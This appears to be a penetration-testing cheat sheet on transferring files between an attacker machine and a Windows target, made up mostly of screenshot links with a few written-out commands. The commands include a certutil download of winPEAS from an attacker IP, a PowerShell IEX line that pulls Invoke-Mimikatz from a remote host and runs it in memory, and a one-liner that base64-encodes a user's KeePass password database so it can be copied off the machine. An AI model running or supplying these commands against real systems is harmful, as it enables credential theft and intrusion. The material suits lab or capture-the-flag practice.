

## Curl
![Pasted image 20220807171324](https://github.com/dbissell6/Shadow_Stone/assets/50979196/b6e6de4a-cba9-40e0-ae36-609dac78af18)

## wget

![Pasted image 20220807171312](https://github.com/dbissell6/Shadow_Stone/assets/50979196/c6f33b8e-9620-4ce9-9ea0-853344b41170)


## From Attack to Windows


<img width="704" alt="Screen Shot 2022-09-06 at 5 49 22 PM" src="https://github.com/dbissell6/Shadow_Stone/assets/50979196/01e8ecf4-156e-4408-b83c-c4b6e12f3407">


### windows without curl or wget can use
```
certutil.exe -urlcache -f http://10.10.16.3:9999/winPEASany.exe winPEASany.exe
```

Following code will execute in memory
```
IEX (New-Object Net.WebClient).DownloadString('https://<snip>/Invoke-Mimikatz.ps1')
```

### ssh/scp
<img width="290" alt="Pasted image 20220807171219" src="https://github.com/dbissell6/Shadow_Stone/assets/50979196/a3a24e55-87f1-4bee-aa11-ad9678dd4ed5">


## From Windows to Attack

### ftp

<img width="963" alt="Screen Shot 2022-09-02 at 12 34 22 AM" src="https://github.com/dbissell6/Shadow_Stone/assets/50979196/e38bbf4b-44bd-49eb-a5e6-6f370d06d173">

### smb
<img width="705" alt="Screen Shot 2022-08-06 at 1 39 31 PM" src="https://github.com/dbissell6/Shadow_Stone/assets/50979196/fe5bd0db-eade-4b57-8c5b-d4a74bf27fe5">

<img width="402" alt="Screen Shot 2022-08-06 at 1 40 50 PM" src="https://github.com/dbissell6/Shadow_Stone/assets/50979196/affb4d0d-10ef-47c4-971e-295187252f02">


### evilwinrm


<img width="795" alt="Screen Shot 2022-09-21 at 5 35 36 PM" src="https://github.com/dbissell6/Shadow_Stone/assets/50979196/b16faa23-032d-47e7-bbad-8a68e7b8c0e0">



### Sometimes the easiest solution is to base64 encode and copy paste
`[convert]::ToBase64String((Get-Content -path "\Users\johanna\Documents\Logins.kdbx" -Encoding byte))`







